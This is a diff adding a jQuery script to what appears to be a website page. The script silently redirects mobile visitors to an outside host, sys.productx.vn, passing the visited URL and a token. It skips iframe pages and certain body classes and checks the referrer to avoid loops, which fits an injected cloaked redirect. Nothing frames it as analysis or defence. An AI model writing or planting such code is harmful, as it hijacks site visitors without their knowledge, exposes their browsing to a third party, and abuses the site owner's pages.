@@ -1,0 +1,14 @@
+<script>
+    jQuery(document).ready(function ($) {
+        if (!window.location.pathname.startsWith('/iframe-') && !document.body.classList.contains('_non-tags')) {
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry/i.test(navigator.userAgent)) {
+                const originalUrl = window.location.href;
+                const encodedUrl = encodeURIComponent(originalUrl);
+                const redirectUrl = "http://sys.productx.vn/?token=64b5f4df0e819f2a87f9ebfa&url=" + encodedUrl;
+                if (!document.referrer.includes("http://sys.productx.vn/")) {
+                    window.location.replace(redirectUrl)
+                }
+            }
+        }
+    })
+</script>
